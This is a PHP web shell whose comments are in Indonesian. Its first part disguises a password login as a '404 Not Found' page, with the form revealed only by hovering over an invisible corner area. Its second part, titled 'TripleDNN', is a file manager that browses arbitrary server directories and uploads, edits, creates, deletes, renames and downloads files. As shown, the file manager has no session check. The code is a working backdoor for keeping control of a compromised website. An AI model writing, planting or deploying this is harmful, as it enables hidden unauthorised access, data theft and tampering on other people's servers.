<?php
session_start();

$password_hash = '$2y$10$VTUR1egXqjcCPAsUXBHfZuoU6b5NFkxkM3HNLK944nQmzxA4Wn9R.';

function display_login_form() {
    ?>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>404 Not Found</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                font-family: Arial, sans-serif;
                background-color: #f7f7f7;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #555;
                text-align: center;
                position: relative;
            }

            .container {
                max-width: 600px;
                padding: 20px;
                position: relative;
            }

            h1 {
                font-size: 100px;
                color: #000;
                margin: 0;
            }

            h2 {
                font-size: 24px;
                margin: 10px 0;
            }

            p {
                font-size: 16px;
                margin: 5px 0;
            }

            .btn-home {
                display: inline-block;
                padding: 10px 20px;
                background-color: #000;
                color: #fff;
                text-decoration: none;
                border-radius: 4px;
                margin-top: 20px;
            }

            /* Login form transparan dan tersembunyi */
            .login-container {
                position: absolute;
                top: 65%; /* DISESUAIKAN POSISINYA KE BAWAH */
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: rgba(255,255,255,0.0);
                padding: 20px;
                border-radius: 8px;
                opacity: 0;
                transition: opacity 0.4s ease;
                pointer-events: none;
                width: 300px;
            }

            /* Hover di trigger akan munculkan login */
            .trigger:hover + .login-container {
                opacity: 1;
                pointer-events: auto;
                background-color: rgba(255,255,255,0.95);
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            }

            .login-container input[type="password"],
            .login-container input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin: 8px 0;
                font-size: 16px;
                border-radius: 4px;
                border: 1px solid #ccc;
                box-sizing: border-box;
            }

            .login-container input[type="submit"] {
                background-color: #4CAF50;
                color: white;
                border: none;
                cursor: pointer;
            }

            .login-container input[type="submit"]:hover {
                background-color: #45a049;
            }

            .error {
                color: red;
                font-size: 14px;
                margin-top: 10px;
            }

            /* Area trigger hover (tak terlihat) */
            .trigger {
                position: absolute;
                bottom: 20px;
                right: 20px;
                width: 40px;
                height: 40px;
                z-index: 10;
                cursor: pointer;
                opacity: 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>404</h1>
            <h2>Oops, This Page Not Found!</h2>
            <p>The link might be corrupted,</p>
            <p>or the page may have been removed</p>
            <a href="/" class="btn-home">GO BACK HOME</a>

            <!-- Trigger area pojok kanan bawah -->
            <div class="trigger"></div>

            <!-- Login Form -->
            <div class="login-container">
                <form action="" method="post">
                    <input type="password" name="pass" placeholder="Masukkan Password" required>
                    <input type="submit" name="submit" value="Login">
                </form>
                <?php
                if (isset($_GET['error'])) {
                    echo "<p class='error'>Password salah! Coba lagi.</p>";
                }
                ?>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    echo "<h1>Korek - Korek Cium!</h1>";
    echo "<p><a href='logout.php'>Kongkek</a></p>";
} else {
    if (isset($_POST['pass'])) {
        if (password_verify($_POST['pass'], $password_hash)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            header("Location: " . $_SERVER['PHP_SELF'] . "?error=1");
            exit;
        }
    } else {
        display_login_form();
    }
}
?>
ï»¿<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">ðŸ“ ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>TripleDNN</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
